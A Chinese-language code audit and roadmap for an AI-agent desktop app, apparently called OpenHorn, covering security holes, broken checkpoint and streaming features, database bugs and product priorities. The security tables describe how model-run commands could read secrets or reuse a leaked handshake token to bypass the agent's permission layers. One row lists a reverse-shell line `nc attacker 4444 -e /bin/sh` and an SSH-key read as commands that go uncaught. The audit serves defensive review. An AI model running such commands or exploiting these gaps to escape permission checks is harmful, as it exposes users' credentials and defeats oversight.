# OpenHorn 全库审查与迭代方向

> 审查日期：2026-07-26 ｜ 范围：apps/server、apps/desktop、apps/sidecar、packages/adapters、apps/web、部署与文档
> 方法：4 路并行代码通读 + 关键结论主进程实测复核

## 修复进度（2026-07-26 更新）

**已修复**：A1、A2、A3、A4、C1、C2、C3、C7，外加一处报告未覆盖的同类缺陷（`chatCodex.ts` 的 `Bun.spawn` 裸继承环境）。
详见 `.trellis/tasks/07-26-p0/result.md`。C1 有端到端正反向实测证据；C2 因本机 codex CLI 上游 502，仅有单元测试覆盖。

**前提已变更**：B1/B2 —— 经查 `claude-agent-sdk@0.2.71` 完整支持 sandbox 配置（`sdk.d.ts:1040`、`:2860`），死函数 `buildNetworkAllowedDomains()` 正好产出 `network.allowedDomains`。原"补齐或降级文档二选一"应改为**建议补齐**。属行为变更，待决策。

**未修**：C4、C5、C6、D1、D2 及全部 P1。以下正文中这些条目仍然成立（已于修复后复核）。

---

## 零、一句话结论

**桌面端 + sidecar 本地 Agent 链路是 OpenHorn 真正的差异化资产**（MCP 按需连接与健康检测、Skill 渐进式加载、三运行时并存、本机 CLI 凭据复用），深度已超过 Cherry Studio / LobeChat 同类能力。

但代价是三块塌陷：

1. **安全模型是纸面的** —— `sidecar-security.md` 声称的 8 层里，第 6 层（SDK 沙箱）在代码中完全不存在，且有一个函数带着 4 个绿色测试假装它存在。
2. **两个核心功能实际是坏的** —— checkpoint 回滚从未真正写入过 manifest；Codex 运行时的流式文本从不推向 UI。
3. **Web 端已停更成半死状态** —— `/agent` 路由直接 `notFound()`，无 MCP / Skill 设置。

另外有一条**文档与现实不符**需要先纠正（见第五节）。

---

## 一、P0：必须立刻处理

### A. 安全 —— 密钥可被模型直接读走

| # | 位置 | 问题 |
|---|---|---|
| A1 | `apps/server/src/services/bashToolExecutor.ts:48-50` | `execFileAsync("bash", ["-lc", command], { env: process.env })` 把**整个进程环境**透传给模型生成的任意命令。`ENCRYPTION_KEY`、`JWT_SECRET`、全部 provider key 一条 `printenv` 即可取走。**已实测确认。** |
| A2 | `apps/server/src/utils/shellRisk.ts:36` | `classifyBashCommandRisk` 是**黑名单**，仅 6 条规则，末行 `return { level: "allow" }` —— 默认放行。`cat ~/.ssh/id_rsa`、`find . -delete`、`nc attacker 4444 -e /bin/sh` 全部不触发审批。**已实测确认。** |
| A3 | `apps/sidecar/src/agent/direct.ts:247-261` | `exec()` 不传 `env`，子进程继承 `OPENHORN_HANDSHAKE_TOKEN`。模型拿到握手令牌后可自行建立新 sidecar 连接，绕过全部权限层。 |
| A4 | `apps/sidecar/src/agent/claude.ts:189-204` | 自建剥离表未使用 `sanitizeChildEnv`，`OPENHORN_HANDSHAKE_TOKEN` / `OPENAI_API_KEY` / `JWT_SECRET` / `DATABASE_URL` 原样传给可执行 Bash 的 SDK 子进程。与 `childEnv.ts:15` 的设计意图直接矛盾。 |

**修法**：`sanitizeChildEnv` 已经是正确答案，但只有 codex 和 MCP 两条路径用了。改造 `claude.ts` 与 `direct.ts`/server 的 `bashToolExecutor` 统一走它，再加一条覆盖全部 4 条 spawn 路径的参数化测试：「任何子进程 env 都不得包含 `OPENHORN_` 前缀的 key」。同时把 `shellRisk` 反转为默认 `confirm`、白名单放行只读命令族。

### B. 安全文档说谎 —— 信任基线问题

| # | 位置 | 问题 |
|---|---|---|
| B1 | `skills/openhorn/rules/sidecar-security.md:10` | 第 6 层「SDK 内建 sandbox（`sandbox-exec`/`bwrap`，`allowUnsandboxedCommands:false`）」**代码中零实现**。全仓 grep `sandbox` 只命中 `codex.ts:324` 的 `sandbox: "danger-full-access"` —— 恰好相反。**已实测确认。** |
| B2 | `apps/sidecar/src/agent/claude.ts:159` | `buildNetworkAllowedDomains()` 被导出、被 `claude.test.ts` 的 4 个用例覆盖，但**从未在 `queryOptions` 中使用**。这是「有绿色测试的死代码」，最容易造成安全已实现的误判。**已实测确认调用点只有测试文件。** |
| B3 | `apps/sidecar/src/agent/claude.ts:259` | 实际配置是 `permissionMode: "bypassPermissions"` + `allowDangerouslySkipPermissions: true`。 |
| B4 | `apps/sidecar/src/agent/codex.ts:135-137, 260, 324` | codex 运行时以 `approval_policy="never"` + `sandbox_mode="danger-full-access"` 启动，且对任何审批请求无条件回 `accept`。**该运行时不经过任何一层防护**，安全文档对此只字未提。 |
| B5 | `apps/sidecar/src/index.ts:566` + `mcp-tools.ts:82-92` | `mcp.test` 与 `agent.run.mcpServers` 允许经 WebSocket 指定任意 `command`+`args` 并 spawn —— 绕过 shell-risk 的直接 RCE 原语，8 层模型完全没覆盖。 |

**修法（二选一，必须立刻做）**：要么在 `queryOptions` 真实传入 sandbox 字段并接上 `buildNetworkAllowedDomains`；要么诚实改写文档为「当前无 sandbox，依赖 shell-risk + 审批」并删掉死函数及其测试。无论哪条，都要把文档扩为 10 层，显式记录 codex 运行时与 MCP spawn 这两个当前完全不设防的面。建议加 CI 断言让文档与代码的漂移在流水线上断掉。

### C. 功能实际是坏的

| # | 位置 | 问题 |
|---|---|---|
| C1 | `apps/sidecar/src/checkpoints.ts:27` + `claude.ts:215-222` | Claude SDK 的 `PreToolUse` hook 传入**绝对路径** → `normalizeRelPath` 抛 `Invalid relative path` → 被空 `catch` 吞掉 → `session.files` 永远为空 → `claude.ts:397` 的 `files.size > 0` 永不成立 → **manifest 从不写入，checkpoint/rollback 在真实运行中完全失效**。第 8 层安全保障建立在它之上。**已核实 `normalizeRelPath` 对 `/` 开头路径必抛错。** |
| C2 | `apps/sidecar/src/agent/codex.ts:273-274` | Codex 的 `agentMessage/delta` 被映射后**只累加进 `pendingText`，从不 `onEvent` 转发**。这就是「事件链路 OK 但 UI 不显示」的构造性根因 —— 链路确实收到了 delta，但根本没有事件被推向 UI。文本只在 `finish()` 里以 8 字符/15ms 补发，3000 字需 5.6 秒且发生在 `turn/completed` 之后。**已实测确认代码为 `if (event.type === "text") { pendingText += event.content; }`。** |
| C3 | `apps/sidecar/src/index.ts:465-472` | codex 分支只传 `{model, prompt, cwd, ...}`，**`conversationHistory` / `systemPrompt` / `mcpServers` / `webSearchEnabled` 全部丢失** → Codex 会话没有上下文记忆。 |
| C4 | `apps/desktop/src-tauri/src/lib.rs:140-145` | `start_sidecar_internal` 只要 guard 非空就返回旧 endpoint，**从不检查子进程存活**；`CommandEvent::Terminated` 启动后不再被监听。sidecar 崩溃后 10 次退避重连全打死端口，**唯一出路是重启整个 App**。 |
| C5 | `apps/sidecar/src/agent/direct.ts:208-211, 826` | direct 运行时注入 skill 提示让模型读绝对路径 `SKILL.md`，但 `resolveReadPathInWorkspace` 无 `readAllowRoots` 白名单，该路径必被拒 → **Agent Skills 在 direct（OpenAI/通用）运行时 100% 不可用**。 |
| C6 | `apps/sidecar/src/protocol.ts:91` | `AgentRunParamsSchema.protocol` 枚举 `["anthropic","openai","codex_cli"]` **不含 `google`**，而 `ChatStreamParamsSchema` 放行 google、服务端 `channelAgentCheckService:580` 又判定 google 可用 agent —— 三处判断彼此矛盾。 |
| C7 | `apps/desktop/src/stores/sidecarStore.ts:212, 293` | 默认 workspace 是 `/tmp`，而 `workspace.ts:30,35` 把 `/tmp` 和 `/private/tmp` 都列为**禁止根**。macOS 上 `realpath("/tmp")="/private/tmp"` → `setWorkspace` 必抛错 → 被 `catch {}` 静默吞 → `workspaceRoot` 保持 null → `index.ts:378` 的 `|| homedir()` 让 agent 工作区**落到用户家目录**（恰是明确禁止的路径）。默认值与 deny-list 自相矛盾。 |

### D. 数据层

| # | 位置 | 问题 |
|---|---|---|
| D1 | `apps/server/src/db/bootstrap.ts:966 → 995` | `SCHEMA_DDL`（含 27 条 `CREATE INDEX`）先执行，`ensureDeleteSemanticsForeignKeys()` 最后执行且会 `DROP TABLE` 7 张核心表。SQLite `DROP TABLE` 连带删除索引，而迁移**不重建**。→ 执行该迁移那次启动之后，整个进程生命周期所有查询走全表扫描。 |
| D2 | `apps/server/src/services/unifiedConversationService.ts:184-207` | `ensureLegacyAgentSessionsMigrated` 在**每次 `GET /conversations`** 都跑，且**无事务、无幂等锁**。并发两个请求会各自迁移同一批 session → **重复会话 + 重复消息**。 |

---

## 二、P1：影响体验与可维护性

**性能**
- `apps/server/src/services/messageService.ts:933-949` — 读路径触发写的 N+1：含 20 个 agent 任务的会话每次打开 ≈ 160 查询 + 20 次写，最后还把消息全量重读一遍。
- `apps/server/src/routes/agent.ts:668-697` — 审批轮询每 600ms 调一次 `getAgentTaskDetail`（6 查询含全量 events），最长 30 分钟 → 峰值 18 万次查询。
- `apps/desktop/src/components/chat/DesktopChatArea.tsx:200-229` — `input`/`slashOpen`/`slashQuery` 等 5 个纯 composer 局部状态被提升到 ChatArea，**每次按键重渲染整个消息列表 + 虚拟化器**；`DesktopComposer` 未 memo 且接收 ~25 个每次新建的 props。
- `apps/desktop/src/stores/chatStore.ts:249-260` — `updateCachedMessage` 对整个 LRU（20 会话）线性扫描找 messageId，后台会话流式时每 token 触发一次全缓存扫描。
- `getMessages`（`messageService.ts:917`）、`getAgentEvents`（`agentService.ts:65`）均无 LIMIT / 分页。

**鉴权**
- `apps/server/src/routes/agent.ts` 的 23 个端点里，`taskId`/`sessionId` 归属校验做得不错，但 **body 传入的外键 `conversationId`/`channelId`/`modelId` 一律零校验**（`agent.ts:1606`、`:1911`、`:1925`）；且 `db.update` 不检查 `rowsAffected`，对他人资源恒返 200。
- `agent.ts:1925` 的 `status` 是未校验的任意字符串，TS 联合类型运行时不生效。
- `apps/server/src/services/agentTaskService.ts:923-945` — `respondToAgentApproval` 无状态机守卫，已完成任务可被反复改写状态。

**adapters 协议能力矩阵不齐**（这是最大的架构落差）

| 能力 | OpenAI | Anthropic | Google |
|---|---|---|---|
| `runToolCallingTurnStream` | ✅ | ❌ | ❌ |
| 非 SSE 响应嗅探回退 | ✅ | ❌ | ❌ |
| abort reason 透传 | ✅ | ✅ | ❌ |
| `tool_choice` 降级重试 | ❌ | ✅ | ❌ |
| tool-calling 阶段 usage | ❌ | ❌ | ❌ |
| tool-calling 阶段图片 | ❌ | ❌ | ❌ |

- `packages/adapters/src/adapters.ts:810` — 只有 OpenAI 实现流式 tool-calling，**Anthropic/Google 的 agent 回合必须等整回合结束才见首字**。
- `types.ts:40-44` — `GenericAgentTurnResult` 无 usage 字段，三个 adapter 都不解析；`sidecar/agent/events.ts:77` 对 SDK 的 `result` 消息 `return null` → **整条 agent 链路零 token 统计**，数据在链路里被主动丢弃。
- `adapters.ts:1301` vs `628` — Anthropic/Google 硬编码 `"data: "`（带空格），OpenAI 用 `"data:"`+`trimStart()`。发送 `data:{...}` 的网关在 OpenAI 下正常、在另两个协议下**整流静默丢弃**。
- 不一致根因是同一个模式：**新能力只在一个 adapter 上实现然后就地停下**。建议抽共享 `parseSseStream()` helper，并改用 `describe.each([openai, anthropic, google])` 参数化矩阵测试，让缺实现在 CI 直接失败。

**代码结构**
- `DesktopChatArea.tsx` 1709 行，19 个 store 订阅 + 12 个 useState + 8 个 useEffect + 7 条业务链路；`conversationHistory` 构建逻辑逐字复制三处。
- `chatStore.ts` 33 个成员，混入 sidecar 运行期胶水。
- `routes/*.ts` 34 处逐字复制的 `catch → 400`，应换 Hono `app.onError` + 领域错误类。
- `DesktopMessageBubble.tsx:205-216` — memo 比较器故意忽略 `onEdit`/`onRetry`/`onDelete`，但这些闭包捕获了 `messages` → **过期闭包**，编辑/重试可能读到旧快照（潜在正确性 bug，非纯性能）。

**未提交的 6 个文件**：`tsc --noEmit` 通过，但 `biome check` 报 11 errors —— `DesktopMessageActionBar.tsx:1` 的 `Check, Copy` 变成未使用导入（改动未完成）、新内联 SVG 缺 a11y title、`DesktopChatArea.tsx:1688` 未跑 format。另外那次「用 20 行手写 SVG 替换 `<Copy/>`」的改动看不出正向价值（同文件仍从 lucide 导入其他 3 个图标），建议整体回退。

**其他**
- `apps/desktop/src/components/chat/DesktopMarkdownMessage.tsx:297` — 每个链接从 `google.com/s2/favicons` 拉 favicon，**把用户所有对话中出现的域名泄露给 Google**（对本地优先的桌面 Agent 而言不合适）。
- `apps/server/src/utils.ts:7-12` — 裸 SHA-256 从 `ENCRYPTION_KEY` 派生密钥（无 KDF / salt / 迭代），且每次加解密重算。应改 scrypt/PBKDF2 并缓存。
- 磁盘附件从不删除 —— 三处删除逻辑只删 DB 行，`data/attachments/**` 实体文件永久残留且失去引用无法回收。
- `apps/desktop/src-tauri/` 下 9 个 `claude-*` 临时目录未被 gitignore。
- 内联中文 24 处绕过 i18n 字典，其中 `lib/effectiveModel.ts` 的 6 处**直接渲染到 UI**。字典本身缺 sidecar 运行期与模型可用性两类 key。

**测试缺口（按重要性）**
- `index.network.test.ts` 只有 4 例，**握手 token 拒绝、未认证方法拦截、`checkpoint.rollback` 的 `ownedRunIds` 授权全部无测试** —— 恰是 8 层模型第 2、8 层的核心。
- `codex.ts`（383 行）零测试；`chat.ts`/`chatCodex.ts`/`events.ts` 同样零测试。
- `checkpoints.test.ts` 用**相对路径**调用，而生产传绝对路径 —— 测试用了与生产不同的输入形态，正是它掩盖了 C1 那个真实 bug。
- direct 运行时的 bash 审批绕过路径无测试：`shell-risk` 测得再好，也没测「它是否真的被调用」。

---

## 三、半成品盘点

29 个 active 任务中，`task.json` 的 status 字段**全部停留在 in_progress/planning，不具备判断力**。基于代码实证，真正的半成品是 6 个：

| 任务 | 实际状态 |
|---|---|
| `06-29-tavily-firecrawl` | **~50%** — Tavily 优化 + DDG 降级做了，**Firecrawl 接入完全没做**（全仓 grep 仅命中 `lib.rs` 的一句注释）。标题一半没兑现。 |
| `06-30-skill` | 桌面端完成，但**架构与 PRD 完全不符** —— PRD 定的是 DB 两表 + `routes/skills.ts`，实际服务端零 skill 痕迹，改成了 Tauri 本地文件方案。Web/服务端 Agent 永久无 Skill 能力。 |
| `07-03-mcp-health-check` | 桌面端完成；但服务端 `mcpService.ts:159` 的 `testMCPServer` 仍是 `return { success: false, error: "not implemented" }` 空壳 —— **Web 端 MCP 测试等于没有**。已实测确认。 |
| `07-06-message-cache-refactor` | **~40%，且从未正式立项**（无 task.json，PRD 开头写「状态：待你审阅」）。LRU 上限加了，但「双写」根因仍在。 |
| `07-07-desktop-i18n-inline-string-migration` | **~80% 且有回退**（最新 commit `6a1a5d1` 回退品牌名迁移）。 |
| `05-12-sidecar-agent` | 无 PRD，事实上被 `07-03-mcp-targeted-connection` 取代，应归档。 |

其余 20+ 个任务代码上已完成，只是没 archive。**建议先做一轮状态清理**，否则任务列表持续失去信噪比。

---

## 四、产品迭代方向

### 现状定位

Web 端已从「独立组件树」演化成「停更」：设置 4 tab vs 桌面 7 tab，无 MCP、无 Skill、无认证来源、无 slash 命令、无虚拟化、无 i18n，`/agent` 路由直接 `notFound()`。**Web 只剩聊天 + 渠道设置三件事，Desktop 是唯一的产品主体。**

### 行业标配缺口（全部经 grep 验证不存在）

| 缺失 | 参照 |
|---|---|
| 知识库 / RAG / 向量检索 | Cherry Studio、LobeChat、Open WebUI **都有** |
| 会话导出 / 分享链接 | 连导出 Markdown 都没有 |
| Prompt 库 / 助手预设 | 只有全局单条自定义指令 |
| 用量 / Token / 成本统计 | adapters 解析了 usage 但**在链路里被丢弃**，schema 无字段 |
| 语音输入输出、图像生成 | 0 命中 |
| 对话分支 / 消息树 | schema 无 `parentMessageId` |
| 多语言 UI | i18n 字典是纯中文，无 locale 概念 |
| 会话文件夹 / 标签 | 只有 `isPinned` |
| 服务端会话/消息搜索与分页 | 全量拉取 + 前端 filter，会话多必崩 |
| 系统托盘 / 全局快捷键 / 桌面通知 / 开机自启 | Cargo.toml 仅 3 个插件 |
| 附件类型 | 仅 png/jpeg/webp/pdf，无 docx/xlsx/csv/txt |

### 分发能力为零

- **无自动更新** —— `tauri.conf.json` 与 `Cargo.toml` 中 `updater` 0 命中。用户装了就永远停在那个版本。**已实测确认。**
- **无 CI** —— `.github/` 目录不存在，无 release workflow、无签名公证。实际只能本机手工出包。**已实测确认。**
- **Docker 构建必然失败** —— `Dockerfile.server` 的 `CMD ["bun","run","start"]` 在 `/app` 根目录执行，但**根 `package.json` 没有 `start` 脚本**（只有 dev:*/build/lint/check/format/typecheck）。另外 `FROM oven/bun:1` 直接 `RUN pnpm install` 而该镜像不自带 pnpm。且 web 端没有 Dockerfile，自托管用户拿不到前端。**已实测确认。**

### 推荐路线（按投入产出排序）

**第一阶段——先把已有的东西做成真的（2～3 周）**
不加任何新功能。修 P0 全部 7 条 + D1/D2，收口 6 个半成品，清理任务状态。理由：当前「checkpoint 回滚」「Codex 流式」「Agent Skills 在 direct 运行时」三个已宣称的功能实际是坏的，在这之上加新功能只会放大债务。这一阶段结束时应能诚实地说「文档写的每一条都能跑」。

**第二阶段——补上决定留存率的三件事（3～4 周）**
1. **用量统计** —— 数据已经在 adapters 里被解析出来又丢掉，接回来是最低成本的高感知功能：`GenericAgentTurnResult` 加 usage → schema 加字段 → 会话/全局两级统计 UI。
2. **会话导出 + 分享** —— 自托管用户的高频诉求，实现成本低（Markdown/JSON 导出 + 可选只读分享页）。
3. **adapters 能力矩阵拉齐** —— 给 Anthropic/Google 补流式 tool-calling。目前这两个协议的 agent 体验明显劣于 OpenAI，而 Claude 恰恰是本产品的主力场景。

**第三阶段——分发（2 周）**
CI + 自动更新 + 修 Docker。没有自动更新的桌面应用等于每个版本都要用户手动重装，这会直接卡死增长。优先级排在新功能之前。

**第四阶段——差异化加深（选一，不要都做）**
- **本地知识库/RAG** —— 与「本地优先 + sidecar 文件访问」的定位最契合，是唯一能与 Cherry Studio 正面竞争的方向。
- **Prompt 库 + 会话文件夹** —— 成本低、见效快，但同质化，不构成壁垒。

推荐前者，理由是 OpenHorn 已有 sidecar 的工作区文件访问能力，做本地 RAG 的边际成本远低于从零开始，且能复用已有的 workspace 边界安全模型。

**关于 Web 端的建议：明确砍掉或明确补齐，不要维持现状。** 当前状态既拿不出手又持续消耗维护成本。若定位是自托管，Web 反而应该是主入口（浏览器零安装）；若定位是本地 Agent 工作台，就把 web 降级为文档站或直接移除，`/agent` 那个 `notFound()` 路由至少要删掉。

---

## 五、文档与现实不符（需先纠正）

**`CLAUDE.md` 的 "Server baseline noise: ~15 pre-existing test failures（db.delete is not a function）" 已经过时。**

实测结果：

```
bun test v1.3.10 — 154 pass / 0 fail / 556 expect() calls — 36 files, 6.93s
```

根因已被修复：`channelService.agent-check-baseurl.test.ts` 用 `mock.module("../db")` 替换了整个 db 模块，而 Bun 的 `mock.module()` 是**进程级全局且无法注销**，导致同进程后续测试调用 `db.delete` 时炸掉。现在的修法是在模块求值期用 `{...realDbNs}` 打快照、`afterAll` 还原真身（关键点：`import * as` 命名空间是活视图，直接用它还原会把 mock 还原成 mock）。

两件事：
1. **CLAUDE.md 该条应删除** —— 它现在会误导后续开发者接受一个不存在的红色基线。
2. **这个修复是脆弱的约定而非机制** —— 任何新增 `mock.module("../db")` 的测试只要漏掉快照 + 还原，基线失败就会复活。建议抽成 `test-utils/moduleSnapshot.ts` 的 `withRealModules([...])` helper。

---

## 附：修复优先级速查

```
立刻（本周）
  A1 A2         server bash 执行器环境隔离 + 风险分类反转为白名单
  A3 A4         sidecar 统一 sanitizeChildEnv，堵握手令牌外泄
  B1 B2         补齐或诚实降级安全文档第 6 层，删除死代码
  C1            checkpoint 路径转换，恢复回滚功能
  C2 C3         Codex delta 直通 + 补回 conversationHistory

两周内
  C4 C7         sidecar 存活检测 + workspace 默认值修正
  C5 C6         direct 运行时 skill 可用性 + google 协议三处判断统一
  D1 D2         迁移后重建索引 + legacy 迁移移出请求路径
  未提交改动     跑 biome、回退无价值的 SVG 替换、补 loading 态

一个月内
  鉴权中间件     统一 assertOwned + rowsAffected 检查
  性能           读路径去写、审批轮询改事件、composer 状态下沉
  adapters       共享 parseSseStream + 矩阵测试 + usage 字段
  CLAUDE.md      删除过时的测试基线描述
```
